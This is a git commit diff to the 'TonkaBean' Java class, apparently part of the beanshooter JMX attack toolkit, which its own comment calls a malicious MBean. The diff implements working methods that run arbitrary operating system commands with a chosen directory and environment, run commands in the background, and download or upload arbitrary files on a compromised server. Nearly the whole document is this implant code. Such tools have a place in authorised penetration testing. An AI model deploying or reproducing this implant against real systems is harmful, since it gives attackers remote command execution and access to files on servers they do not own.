0889ea15bf368327bff51f91a0514f80775a8753
TNeitzel <qtc_de@outlook.com>
2022-01-21 07:18:23 +0100

    Update TonkaBean
    Updated the operations on the TonkaBean. Command execution now supports
    changing the current working directory and specifying environment
    variables. This functionality can also be used during the shell action
    to make the shell directory and environment aware.

--- tonka-bean/src/de/qtc/beanshooter/tonkabean/TonkaBean.java
+++ tonka-bean/src/de/qtc/beanshooter/tonkabean/TonkaBean.java
@@ -1,55 +1,116 @@
 package de.qtc.beanshooter.tonkabean;
 
-import java.io.*;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.nio.file.Files;
+import java.util.Map;
+import java.util.Scanner;
 
-public class TonkaBean implements TonkaBeanMBean {
-
-    public static void main(String[] argv)
+/**
+ * The TonkaBean is an example for a malicious MBean. When deployed on an MBeanServer, it allows
+ * executing operating system commands and gives access to the file system of the server.
+ *
+ * @author Tobias Neitzel (@qtc_de)
+ */
+public class TonkaBean implements TonkaBeanMBean
+{
+    /**
+     * Checks whether the specified path is an existing directory on the server and returns
+     * the normalized form of it.
+     *
+     * @param path file system path to check
+     * @return normalized File
+     */
+    public File toServerDir(File path) throws IOException
     {
-      System.out.println("[+] Hi! I'm the tonka-bean.");
-      System.out.println("[+] Deploy me on a JMX endpoint and I can do some useful things for you :)");
+        if( !path.isDirectory() )
+            throw new IOException("Specified path " + path.toString() + " is not a directory.");
+
+        return path.getAbsoluteFile();
     }
 
-    public String executeCommand(String command) throws IOException, InterruptedException
+    /**
+     * Execute the specified operating system command. Commands need to be specified as an array with the
+     * executable in the first position followed by the arguments for the call. Furthermore, the directory
+     * to execute the command in and environment variables can be specified.
+     *
+     * @param command String array that specified the operating system command
+     * @param cwd working directory for the call
+     * @param env environment variables to use for the call
+     */
+    public String executeCommand(String[] command, File cwd, Map<String,String> env) throws IOException, InterruptedException
     {
-        Runtime runTime = Runtime.getRuntime();
-        Process proc = runTime.exec(command);
+        ProcessBuilder builder = new ProcessBuilder(command);
+        builder.directory(cwd);
+        builder.environment().putAll(env);
+
+        Process proc = builder.start();
         proc.waitFor();
 
-        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-        BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+        String output = "";
 
-        String s;
-        String stdOutErrData = "";
+        try(Scanner scanner = new Scanner(proc.getInputStream()).useDelimiter("\\A"))
+        {
+            output += scanner.hasNext() ? scanner.next() : "";
+            scanner.close();
+        };
 
-        while ((s = stdInput.readLine()) != null) {
-            stdOutErrData += s+"\n";
+        try(Scanner scanner = new Scanner(proc.getErrorStream()).useDelimiter("\\A"))
+        {
+            output += scanner.hasNext() ? scanner.next() : "";
+            scanner.close();
         }
 
-        while ((s = stdError.readLine()) != null) {
-            stdOutErrData += s+"\n";
-        }
-
-        return stdOutErrData;
+        return output;
     }
 
-    public void executeCommandBackground(String command) throws IOException
+    /**
+     * Execute the specified operating system command in the background. Commands need to be specified as an array
+     * with the executable in the first position followed by the arguments for the call. Furthermore, the directory
+     * to execute the command in and environment variables can be specified.
+     *
+     * @param command String array that specified the operating system command
+     * @param cwd working directory for the call
+     * @param env environment variables to use for the call
+     */
+    public void executeCommandBackground(String[] command, File cwd, Map<String,String> env) throws IOException
     {
-        Runtime runTime = Runtime.getRuntime();
-        runTime.exec(command);
+        ProcessBuilder builder = new ProcessBuilder(command);
+        builder.directory(cwd);
+        builder.environment().putAll(env);
+        builder.start();
     }
 
-    public String ping() {
+    /**
+     * Verify that the MBean is working as expected by returning the string "pong!";
+     *
+     * @return static string "pong!"
+     */
+    public String ping()
+    {
         return "pong!";
     }
 
+    /**
+     * Return the content of the specified file.
+     *
+     * @param filename file system path to the file to download
+     * @return byte array containing the file content
+     */
     public byte[] downloadFile(String filename) throws IOException
     {
         File file = new File(filename);
         return Files.readAllBytes(file.toPath());
     }
 
+    /**
+     * Write the specified byte array to the specified destination on the file system of the server.
+     *
+     * @param destination file system path on the MBean Server
+     * @param content byte array containing the desired file content
+     * @return resulting file system path of the newly generated file
+     */
     public String uploadFile(String destination, byte[] content) throws IOException
     {
         File file = new File(destination);
--- tonka-bean/src/de/qtc/beanshooter/tonkabean/TonkaBeanMBean.java
+++ tonka-bean/src/de/qtc/beanshooter/tonkabean/TonkaBeanMBean.java
@@ -1,13 +1,16 @@
 package de.qtc.beanshooter.tonkabean;
 
+import java.io.File;
 import java.io.IOException;
+import java.util.Map;
 
-public interface TonkaBeanMBean {
-
+public interface TonkaBeanMBean
+{
     public String ping();
+    public File toServerDir(File cwd) throws IOException;
 
-    public void executeCommandBackground(String cmd) throws IOException;
-    public String executeCommand(String cmd) throws IOException, InterruptedException ;
+    public String executeCommand(String[] cmd, File cwd, Map<String,String> env) throws IOException, InterruptedException ;
+    public void executeCommandBackground(String[] cmd, File cwd, Map<String,String> env) throws IOException ;
 
     public byte[] downloadFile(String filename) throws IOException;
     public String uploadFile(String destination, byte[] content) throws IOException;
